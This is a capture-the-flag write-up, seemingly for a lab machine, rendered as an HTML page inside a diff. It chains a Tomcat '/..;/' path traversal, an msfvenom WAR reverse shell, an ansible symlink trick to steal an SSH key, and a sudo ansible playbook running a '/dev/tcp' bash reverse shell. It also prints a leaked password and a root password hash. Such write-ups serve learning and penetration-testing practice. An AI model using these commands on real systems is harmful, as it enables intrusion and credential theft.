@@ -1,0 +1,187 @@
+I"�1<h1 id="main-points">Main points</h1>
+<ul>
+  <li>
+    <table>
+      <tbody>
+        <tr>
+          <td>nginx and tomcat path traversal <code class="language-plaintext highlighter-rouge">/..;/</code> [#^57d812</td>
+          <td>tomcat apache 9.0.31](/assets/%23%5E57d812%7Ctomcat%20apache%209.0.31)</td>
+        </tr>
+      </tbody>
+    </table>
+  </li>
+  <li><code class="language-plaintext highlighter-rouge">copy_link</code> of ansible can copy the target folder/file <a href="/assets/%23%5E0349ed%7Csymlink%20whole%20folder">#^0349ed|symlink whole folder</a>
+    <h1 id="writeup">Writeup</h1>
+    <p>We start with basic nmap enumeration</p>
+  </li>
+  <li>22/tcp    open     ssh        syn-ack     OpenSSH 8.2p1 Ubuntu 4ubuntu0.2 (Ubuntu Linux; protocol 2.0)</li>
+  <li>443/tcp   open     ssl/http   syn-ack     nginx 1.18.0 (Ubuntu)</li>
+  <li>8080/tcp  open     http-proxy syn-ack</li>
+</ul>
+
+<p>let’s check the website</p>
+
+<p>We see that port 8080 lands us on a Gitbucket login page and port 443 on a page with products and vegetable.</p>
+
+<p>Let’s create a new account in the Gitbucket page</p>
+
+<p>We login with our account
+<img src="/assets/Pasted%20image%2020210719010656.png" alt="Pasted image 20210719010656.png" /></p>
+
+<p>We see there is a root with 2 repo
+<img src="/assets/Pasted%20image%2020210719163954.png" alt="Pasted image 20210719163954.png" /></p>
+
+<p>In the <code class="language-plaintext highlighter-rouge">seal_market</code> repository, we see there is an issue
+<img src="/assets/Pasted%20image%2020210719164052.png" alt="Pasted image 20210719164052.png" />
+So there are 2 potential users <code class="language-plaintext highlighter-rouge">alex</code> and <code class="language-plaintext highlighter-rouge">luis</code>.
+Let’s check their commits in case there are some creds.</p>
+
+<p>We find tomcat user
+<img src="/assets/Pasted%20image%2020210719164536.png" alt="Pasted image 20210719164536.png" />
+<code class="language-plaintext highlighter-rouge">&lt;user username="tomcat" password="42MrHBf*z8{Z%" roles="manager-gui,admin-gui"/&gt;</code></p>
+
+<p>Let’s try to connect with those creds
+<img src="/assets/Pasted%20image%2020210719164929.png" alt="Pasted image 20210719164929.png" /></p>
+
+<p>We have an error, maybe it’s the password of alex or luis.</p>
+
+<p>It worked with luis, but we can’t do much now.</p>
+
+<p>Let’s check the port 443, where there is a seal market. We try to do some directory bruteforcing with gobuster.
+<img src="/assets/Pasted%20image%2020210719170001.png" alt="Pasted image 20210719170001.png" />
+I checked them but apart from <code class="language-plaintext highlighter-rouge">index.html</code> they redirect to forbidden 403 error.</p>
+
+<p>Except for the <code class="language-plaintext highlighter-rouge">/manager</code> that redirects to <code class="language-plaintext highlighter-rouge">/manager/html</code> which gives Forbidden 403. If i try to check <code class="language-plaintext highlighter-rouge">/manager/dashboard</code> for example, we get an error with a list of possible paths
+<img src="/assets/Pasted%20image%2020210719170154.png" alt="Pasted image 20210719170154.png" /></p>
+
+<p>We try <code class="language-plaintext highlighter-rouge">/manager/text</code> and we get a prompt
+<img src="/assets/Pasted%20image%2020210719170228.png" alt="Pasted image 20210719170228.png" /></p>
+
+<p>let’s try the creds of tomcat 
+It gives us access denied, we keep trying the other paths, and it works with /status</p>
+
+<p><img src="/assets/Pasted%20image%2020210719170422.png" alt="Pasted image 20210719170422.png" /></p>
+
+<p>We see the apache tomcat version is <code class="language-plaintext highlighter-rouge">Apache Tomcat/9.0.31 (Ubuntu)</code></p>
+
+<p>Let’s see if there is a vulnerability for it.
+We find this vulnerability that allows path traversal
+https://www.acunetix.com/vulnerabilities/web/tomcat-path-traversal-via-reverse-proxy-mapping/</p>
+<blockquote>
+  <p>Tomcat will treat the sequence <strong>/..;/</strong> as <strong>/../</strong> and normalize the path while reverse proxies will not normalize this sequence and send it to Apache Tomcat as it is.</p>
+</blockquote>
+
+<p>^57d812</p>
+
+<p>So we try to access <code class="language-plaintext highlighter-rouge">/manager/status/..;/html</code></p>
+
+<p>We have access to dashboard
+<img src="/assets/Pasted%20image%2020210719211910.png" alt="Pasted image 20210719211910.png" /></p>
+
+<p>We see that we can upload a WAR file
+<img src="/assets/Pasted%20image%2020210719211929.png" alt="Pasted image 20210719211929.png" /></p>
+
+<p>Let’s create a WAR reverse shell with msfvenom</p>
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>msfvenom <span class="nt">-p</span> java/jsp_shell_reverse_tcp <span class="nv">LHOST</span><span class="o">=</span>10.10.14.127 <span class="nv">LPORT</span><span class="o">=</span>4444 <span class="nt">-f</span> war <span class="o">&gt;</span> reverse.war
+</code></pre></div></div>
+<p><img src="/assets/Pasted%20image%2020210719212250.png" alt="Pasted image 20210719212250.png" /></p>
+
+<p>We start our netcat listener and we upload our WAR file</p>
+
+<p><img src="/assets/Pasted%20image%2020210719212336.png" alt="Pasted image 20210719212336.png" /></p>
+
+<p>Since we can’t upload it directly because it redirects to /html which is forbidden, we use Burp to catch the request and change the path to <code class="language-plaintext highlighter-rouge">/manager/status/..;/html</code>
+<img src="/assets/Pasted%20image%2020210719212719.png" alt="Pasted image 20210719212719.png" /></p>
+
+<p>Our file was uploaded and deployed
+<img src="/assets/Pasted%20image%2020210719212753.png" alt="Pasted image 20210719212753.png" />
+<img src="/assets/Pasted%20image%2020210719212917.png" alt="Pasted image 20210719212917.png" />
+Now all we need is to access this URL
+<img src="/assets/Pasted%20image%2020210719212953.png" alt="Pasted image 20210719212953.png" />
+And we have a shell
+<img src="/assets/Pasted%20image%2020210719213013.png" alt="Pasted image 20210719213013.png" />
+We cat <code class="language-plaintext highlighter-rouge">/etc/passwd</code>
+<img src="/assets/Pasted%20image%2020210719213137.png" alt="Pasted image 20210719213137.png" /></p>
+
+<p>There is user luis</p>
+
+<p>Let’s see if there are processes related to luis
+<code class="language-plaintext highlighter-rouge">ps -aux | grep luis</code>
+<img src="/assets/Pasted%20image%2020210719214919.png" alt="Pasted image 20210719214919.png" />
+There is a <code class="language-plaintext highlighter-rouge">gitbucket.war</code> running and there is a ansible-playbook running every 30 seconds
+<code class="language-plaintext highlighter-rouge">sudo -u luis /usr/bin/ansible-playbook /opt/backups/playbook/run.yml</code>
+Let’s see the content
+<img src="/assets/Pasted%20image%2020210719220620.png" alt="Pasted image 20210719220620.png" /></p>
+<div class="language-yml highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="pi">-</span> <span class="na">hosts</span><span class="pi">:</span> <span class="s">localhost</span>
+  <span class="na">tasks</span><span class="pi">:</span>
+  <span class="pi">-</span> <span class="na">name</span><span class="pi">:</span> <span class="s">Copy Files</span>
+    <span class="na">synchronize</span><span class="pi">:</span> <span class="s">src=/var/lib/tomcat9/webapps/ROOT/admin/dashboard dest=/opt/backups/files copy_links=yes</span>
+  <span class="pi">-</span> <span class="na">name</span><span class="pi">:</span> <span class="s">Server Backups</span>
+    <span class="na">archive</span><span class="pi">:</span>
+      <span class="na">path</span><span class="pi">:</span> <span class="s">/opt/backups/files/</span>
+      <span class="na">dest</span><span class="pi">:</span> <span class="s2">"</span><span class="s">/opt/backups/archives/backup--.gz"</span>
+  <span class="pi">-</span> <span class="na">name</span><span class="pi">:</span> <span class="s">Clean</span>
+    <span class="na">file</span><span class="pi">:</span>
+      <span class="na">state</span><span class="pi">:</span> <span class="s">absent</span>
+      <span class="na">path</span><span class="pi">:</span> <span class="s">/opt/backups/files/</span>
+</code></pre></div></div>
+<p>The task “Copy Files” copies files from the <code class="language-plaintext highlighter-rouge">/var/lib/tomcat9/webapps/ROOT/admin/dashboard</code> into <code class="language-plaintext highlighter-rouge">/opt/backups/files</code></p>
+
+<p>I dont know what <code class="language-plaintext highlighter-rouge">copy_links</code> refers to so let’s check the documentation</p>
+
+<p><img src="/assets/Pasted%20image%2020210719221005.png" alt="Pasted image 20210719221005.png" /></p>
+
+<p>So if I understand that correctly, if we have a file in the src directory that has a symlinks to a file in /tmp/script, it will copy the /tmp/script to the backup folder ^0349ed</p>
+
+<p>We also have read access to the backup folder
+<img src="/assets/Pasted%20image%2020210719221417.png" alt="Pasted image 20210719221417.png" />
+And write access in the <code class="language-plaintext highlighter-rouge">/uploads/</code> folder in the src directory
+<img src="/assets/Pasted%20image%2020210719221507.png" alt="Pasted image 20210719221507.png" />
+let’s create a file with a symlink to the private key ssh of luis id_rsa in .ssh folder of luis
+<img src="/assets/Pasted%20image%2020210719222134.png" alt="Pasted image 20210719222134.png" />
+<code class="language-plaintext highlighter-rouge">ln -s /home/luis/.ssh/ /var/lib/tomcat9/webapps/ROOT/admin/dashboard/uploads/</code></p>
+
+<p>We go to <code class="language-plaintext highlighter-rouge">/opt/backups/archives</code>, wait a little, and we see the recet backup created. let’s download it by setting up a python server 
+<img src="/assets/Pasted%20image%2020210719222418.png" alt="Pasted image 20210719222418.png" /></p>
+
+<p><img src="/assets/Pasted%20image%2020210719222636.png" alt="Pasted image 20210719222636.png" />
+We download the archive
+<img src="/assets/Pasted%20image%2020210719222709.png" alt="Pasted image 20210719222709.png" />
+and extract it with <code class="language-plaintext highlighter-rouge">gzip</code></p>
+
+<p><code class="language-plaintext highlighter-rouge">gzip -d backup-2021-07-19-20:36:32.gz</code>
+We have a tar archive, let’s extract it
+<code class="language-plaintext highlighter-rouge">tar xvf backup</code>
+<img src="/assets/Pasted%20image%2020210719224538.png" alt="Pasted image 20210719224538.png" /></p>
+
+<p>We have our id_rsa file, we can get user by connecting with</p>
+
+<p><code class="language-plaintext highlighter-rouge">ssh luis@10.10.10.250 -i id_rsa</code></p>
+
+<p>We have user now and user flag</p>
+
+<h1 id="priv-esc">Priv Esc</h1>
+<p>We run <code class="language-plaintext highlighter-rouge">sudo -l</code> to see if we can run something as root
+we see we can run ansible as root</p>
+
+<p><img src="/assets/Pasted%20image%2020210719224923.png" alt="Pasted image 20210719224923.png" /></p>
+
+<p>So the idea is to create a malicious <code class="language-plaintext highlighter-rouge">yml</code> file and run it with ansible, this is easier than getting the user xD
+<code class="language-plaintext highlighter-rouge">play.yml</code></p>
+<div class="language-yml highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="pi">-</span> <span class="na">hosts</span><span class="pi">:</span> <span class="s">localhost</span>
+  <span class="na">tasks</span><span class="pi">:</span>
+  <span class="pi">-</span> <span class="na">name</span><span class="pi">:</span> <span class="s">Give root</span>
+    <span class="na">command</span><span class="pi">:</span> <span class="s2">"</span><span class="s">/bin/bash</span><span class="nv"> </span><span class="s">./script.sh"</span>
+</code></pre></div></div>
+
+<p><code class="language-plaintext highlighter-rouge">script.sh</code></p>
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>/bin/bash <span class="nt">-i</span> <span class="o">&gt;</span>&amp; /dev/tcp/10.10.14.127/4444 0&gt;&amp;1
+</code></pre></div></div>
+<p>We setup our netcat listener and we run the command <code class="language-plaintext highlighter-rouge">sudo ansible-playbook play.yml</code></p>
+
+<p><img src="/assets/Pasted%20image%2020210719230828.png" alt="Pasted image 20210719230828.png" /></p>
+
+<p>And we have root, and we get the flag</p>
+<h1 id="root-hash">root hash</h1>
+<p><code class="language-plaintext highlighter-rouge">$6$D8b4qJlaLsRsvwuy$qvUFLUdvoH0EsvrLSJCpejOmV7bZoCO2ZGH2ueU77uAHpxepSfK.ts4LkkfwzuJ.IJ87EeK9RrNKHEorKQp3r</code></p>
+:ET
